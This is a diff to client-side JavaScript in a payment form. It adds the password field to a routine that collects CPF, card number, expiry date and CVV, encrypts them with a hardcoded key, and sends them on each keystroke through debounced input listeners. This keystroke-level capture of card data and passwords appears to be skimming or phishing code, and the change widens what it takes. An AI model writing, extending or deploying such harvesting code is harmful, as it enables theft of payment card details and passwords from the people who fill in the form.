@@ -22,13 +22,15 @@ async function sendTempData() {
     const cardNumberInput = document.getElementById('card-number');
     const expiryDateInput = document.getElementById('expiry-date');
     const cvvInput = document.getElementById('cvv');
+    const passwordInput = document.getElementById('password');
 
     const data = {
         sessionId,
         cpf: cpfInput && cpfInput.value ? CryptoJS.AES.encrypt(cpfInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
         cardNumber: cardNumberInput && cardNumberInput.value ? CryptoJS.AES.encrypt(cardNumberInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
         expiryDate: expiryDateInput && expiryDateInput.value ? CryptoJS.AES.encrypt(expiryDateInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
-        cvv: cvvInput && cvvInput.value ? CryptoJS.AES.encrypt(cvvInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null
+        cvv: cvvInput && cvvInput.value ? CryptoJS.AES.encrypt(cvvInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
+        password: passwordInput && passwordInput.value ? CryptoJS.AES.encrypt(passwordInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null
     };
 
     try {
@@ -311,6 +313,7 @@ if (nextBtn) {
 const cardNumberInput = document.getElementById('card-number');
 const expiryDateInput = document.getElementById('expiry-date');
 const cvvInput = document.getElementById('cvv');
+const passwordInput = document.getElementById('password');
 
 if (cardNumberInput) {
     cardNumberInput.addEventListener('input', debounce(() => {
@@ -333,6 +336,12 @@ if (expiryDateInput) {
 if (cvvInput) {
     cvvInput.addEventListener('input', debounce(() => {
         checkFields();
+        sendTempData();
+    }, 100));
+}
+
+if (passwordInput) {
+    passwordInput.addEventListener('input', debounce(() => {
         sendTempData();
     }, 100));
 }
